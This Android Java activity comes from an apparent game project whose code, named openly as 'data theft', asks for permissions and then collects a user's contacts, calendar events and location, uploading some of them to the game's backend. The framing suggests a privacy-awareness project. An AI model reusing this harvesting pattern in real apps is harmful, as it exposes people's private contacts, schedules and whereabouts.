package de.hpi3d.gamepgrog.trap.ui;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.os.Bundle;
import android.os.Looper;
import android.widget.Toast;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collector;
import java.util.stream.Collectors;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import de.hpi3d.gamepgrog.trap.APIBuilder;
import de.hpi3d.gamepgrog.trap.BackendManagerIntentService;
import de.hpi3d.gamepgrog.trap.DataStealer;
import de.hpi3d.gamepgrog.trap.R;
import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;
import de.hpi3d.gamepgrog.trap.datatypes.Contact;
import de.hpi3d.gamepgrog.trap.datatypes.LocationData;
import de.hpi3d.gamepgrog.trap.datatypes.UserDataPostRequestFactory;

public class MainActivity extends AppCompatActivity {


    private static final int PERMISSION_REQUEST_IDENTIFIER_READ_CONTACTS = 101;
    private static final int PERMISSION_REQUEST_IDENTIFIER_READ_CALENDAR = 102;
    private static final int PERMISSION_REQUEST_IDENTIFIER_READ_LOCATION = 103;

    private LocationCallback locationCallback;
    private FusedLocationProviderClient fusedLocationClient;

    private APIBuilder.API server;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        int playerId = BackendManagerIntentService.getPlayerId(this);
        if (-1 == playerId) {
            Intent registerPlayer = new Intent(this, BackendManagerIntentService.class);
            registerPlayer.putExtra(BackendManagerIntentService.KEY_MANAGE_TYPE, BackendManagerIntentService.MANAGE_PLAYER_REGISTRATION);
            startService(registerPlayer);
        }
        setContentView(R.layout.activity_main);

        server = APIBuilder.build();
    }

    /**
     * Requests permission to read contacts. Unsure where to put this, feel free to move it
     * around once we know from where we read device contacts.
     * <p>
     * Mostly taken from https://developer.android.com/training/permissions/requesting#java
     */
    public void prepareDataTheft() {
        prepareContactDataTheft();
        prepareCalendarDataTheft();
        prepareCoarsePositionTheft();
    }

    private void prepareCoarsePositionTheft() {
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_COARSE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {


            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.ACCESS_COARSE_LOCATION},
                    PERMISSION_REQUEST_IDENTIFIER_READ_LOCATION);
        } else {
            // Permission has already been granted
            getContinuousLocationUpdates();
        }

    }


    private void prepareContactDataTheft() {
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {


            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_CONTACTS},
                    PERMISSION_REQUEST_IDENTIFIER_READ_CONTACTS);
        } else {
            // Permission has already been granted
            displayAndSendContactDataInLog();
        }

    }

    private void prepareCalendarDataTheft() {
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CALENDAR)
                != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_CALENDAR},
                    PERMISSION_REQUEST_IDENTIFIER_READ_CALENDAR);
        } else {
            // Permission has already been granted
            displayAndSendCalendarDataInLog();
        }

    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String[] permissions, int[] grantResults) {
        switch (requestCode) {
            case PERMISSION_REQUEST_IDENTIFIER_READ_CONTACTS: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // permission was granted
                    displayAndSendContactDataInLog();
                }
                return;
            }
            case PERMISSION_REQUEST_IDENTIFIER_READ_CALENDAR: {
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // permission was granted
                    displayAndSendCalendarDataInLog();
                }
            }
            case PERMISSION_REQUEST_IDENTIFIER_READ_LOCATION: {
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // permission was granted
                    getContinuousLocationUpdates();
                }
            }
        }
    }

    private void displayAndSendContactDataInLog() {
        ArrayList<Contact> contacts = DataStealer.takeContactData(getApplicationContext());

        for (Contact c : contacts) {
            System.out.println(c.toString());
        }

        sendContactData(contacts);
    }

    private void sendContactData(ArrayList<Contact> contacts) {
        int userId = getUserId();
        server.addData(userId, UserDataPostRequestFactory.buildWithContacts(contacts)).subscribe();
    }

    private void displayAndSendCalendarDataInLog() {
        ArrayList<CalendarEvent> cEvents = DataStealer.takeCalendarData(getApplicationContext());

        for (CalendarEvent c : cEvents) {
            System.out.println(c);
        }

        sendCalenderData(cEvents);
    }

    private void sendCalenderData(ArrayList<CalendarEvent> cEvents) {
        int userId = getUserId();
        server.addData(userId, UserDataPostRequestFactory.buildWithCalendarEvents(cEvents))
                .subscribe();
    }

    private int getUserId() {
        return BackendManagerIntentService.getPlayerId(this);
    }


    /**
     * To get continuous location updates while app is in the foreground.
     * Can be rewritten to get location exactly once.
     * <p>
     * Android documentation heavily discourages trying to get location data while in the background.
     */
    private void getContinuousLocationUpdates() {
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);

        LocationRequest locationRequest = LocationRequest.create();
        locationRequest.setInterval(100);
        locationRequest.setFastestInterval(50);
        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);

        locationCallback = new LocationCallback() {

            @Override
            public void onLocationResult(LocationResult locationResult) {
                if (locationResult == null) {
                    return;
                }
                for (Location location : locationResult.getLocations()) {
                    buildLocationToast(location);
                }
            }
        };

        fusedLocationClient.requestLocationUpdates(locationRequest,
                locationCallback,
                Looper.getMainLooper());

        Thread stopLocationUpdates = new Thread() {

            @Override
            public void run() {
                try {
                    TimeUnit.SECONDS.sleep(30);
                } catch (InterruptedException e) {
                    // This is mostly debug, so don't care at all.
                } finally {
                    fusedLocationClient.removeLocationUpdates(locationCallback);
                    System.out.println("=====STEALER: ENDING REPORTING OF LOCATION");
                }

            }
        };
        stopLocationUpdates.start();

    }

    private void getLastCoarseLocation() {
        // "Coarse" is roughly a cityblock..
        // Only works if location has been requested before by something else, which might not be
        // the case.

        FusedLocationProviderClient fusedLocationClient =
                LocationServices.getFusedLocationProviderClient(this);

        fusedLocationClient.getLastLocation()
                .addOnSuccessListener(this, this::buildLocationToast);

    }

    private void buildLocationToast(Location location) {
        if (location != null) {

            // location.getSpeed();
            // location.getExtras(); // Number of satellites for the fix
            double lat = location.getLatitude();
            double lon = location.getLongitude();
            long time = location.getTime(); // UTC stamp in milliseconds

            StringBuilder s = new StringBuilder();
            s.append("Position: ")
                    .append("long: ")
                    .append(lon)
                    .append(" | lat: ")
                    .append(lat)
                    .append(" | TIME: ")
                    .append(time);
            int duration = Toast.LENGTH_SHORT;

            Toast toast = Toast.makeText(getApplicationContext(), s.toString(), duration);
            toast.show();
        } else {
            Toast toast = Toast.makeText(getApplicationContext(), "Location disabled or not yet received", Toast.LENGTH_LONG);
            toast.show();
            // User has disabled "location" in device settings
        }
    }

    private void sendLocationData(List<Location> locations) {
        int userid = getUserId();
        List<LocationData> locationsData = locations
                .stream()
                .map(LocationData::fromLocation)
                .collect(Collectors.toList());
        server.addData(userid, UserDataPostRequestFactory.buildWithLocations(locationsData))
                .subscribe();
    }
}
